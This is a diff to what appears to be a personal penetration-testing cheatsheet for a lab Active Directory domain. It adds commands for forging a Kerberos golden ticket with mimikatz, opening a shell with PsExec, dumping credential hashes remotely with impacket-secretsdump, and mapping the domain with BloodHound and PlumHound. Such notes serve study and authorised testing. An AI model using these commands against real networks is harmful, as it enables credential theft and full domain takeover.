@@ -1,7 +1,7 @@
 +++
 date = '2026-04-28T20:19:35+09:00'
 draft = false
-title = 'OSCP_cheatsheet'
+title = 'Cheatsheet'
 +++
 
 ## Kerberos
@@ -40,6 +40,25 @@ impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70
 hashcat: 
 
 `hashcat -m 18200 hash.txt /path/to/wordlist`
+
+### Golden ticket
+
+krbtgt hash is required.
+
+- From mimikatz
+
+```cmd
+# privilege::debug
+# lsadump::lsa /inject /name:krbtgt   (get SID, NTLM hash)
+ # kerberos::golden /User:fakeuser123 /domain:marvel.local /sid:$SID /krbtgt:$NTLM /id:500 /ptt
+# misc::cmd 
+```
+
+or get a shell using Psexec
+
+```cmd
+PsExec64.exe \\TargetMachine cmd.exe  
+```
 
 ## AlwaysInstallElevated
 
@@ -328,6 +347,25 @@ ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150
 
 ## Impacket
 
+### impacket-secretsdump
+
+It's like a mimikatz that can be used remotely.
+
+Admin priv accounts needed
+
+- local admin
+
+```sh
+impacket-secretsdump marvel.local/fcastle:Password1@$IP
+impacket-secretsdump administrator:@$IP -hahes :$NT
+```
+
+- domain admin
+
+```sh
+impacket-secretsdump MARVEL.local/hawkeye:'Password1'@$DC -just-dc-ntlm
+```
+
 ### impacket-net
 
 *Prepare vaild domain credentials*
@@ -380,4 +418,27 @@ Password changed for user testuser
 
 ```cmd
 .\mysql.exe -uroot -e "show databases;"
+```
+
+## Bloodhound
+
+Get domain information remotely.
+
+Domain user account needed.
+
+```sh
+sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all 
+```
+
+### plumhound
+
+Automatically analyze the result of bloodhound and make a report for me.
+
+neo4j, bloodhound must be running.
+
+```sh
+	1. Check neo4j, bloodhound are running
+	2. sudo python3 PlumHound.py --easy -p {neo4j password}
+	3. sudo python3 PlumHound.py -x tasks/default.tasks -p {neo4j password}  (write a report)
+cd reports 
 ```
